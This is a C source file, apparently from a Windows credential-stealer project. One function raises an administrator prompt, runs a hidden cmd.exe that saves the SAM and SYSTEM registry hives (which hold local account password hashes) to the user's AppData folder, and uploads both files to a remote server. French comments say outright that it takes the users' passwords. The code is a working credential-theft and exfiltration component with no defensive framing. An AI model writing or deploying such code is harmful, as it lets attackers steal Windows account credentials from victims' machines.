#include <windows.h>
#include <shellapi.h>
#include <stdio.h>
#include <curl/curl.h>

#include "../include/structures.h"
#include "../include/http.h"

int save_and_send_windows_users_password(COMPUTER_INFOS *cmp_info) {

    /*Fonction qui permet de récupérer le fichier sam et system qui contiens les mdp
    des utilisateurs windows et de les envoyer au serveur*/

    SHELLEXECUTEINFO sei;
    ZeroMemory(&sei, sizeof(sei));
    sei.cbSize = sizeof(sei);
    sei.lpVerb = "runas"; //  runas pour demander les perm admin
    sei.lpFile = "cmd.exe"; 
    char cmd[1024];
    char sam_file_path[128];
    char system_file_path[128];

    snprintf(sam_file_path, 128, "C:\\Users\\%s\\AppData\\Local\\G666\\sam.save", cmp_info->username);
    snprintf(system_file_path, 128, "C:\\Users\\%s\\AppData\\Local\\G666\\system.save", cmp_info->username);
    snprintf(cmd, sizeof(cmd), "/c reg save HKLM\\SAM %s && reg save HKLM\\SYSTEM %s", sam_file_path, system_file_path);

    sei.lpParameters = cmd;
    sei.nShow = SW_HIDE; // pour masquer laz fenètre du cmd
    if (ShellExecuteEx(&sei)) {
        WaitForSingleObject(sei.hProcess, INFINITE); // attendre que la commande se termine (plus précisement que le processus cmd.exe se termine)

        upload_to_server(sam_file_path, "windowssam", "");
        upload_to_server(system_file_path, "windowssystem", "");

    } else {
        return -1;
    }
}
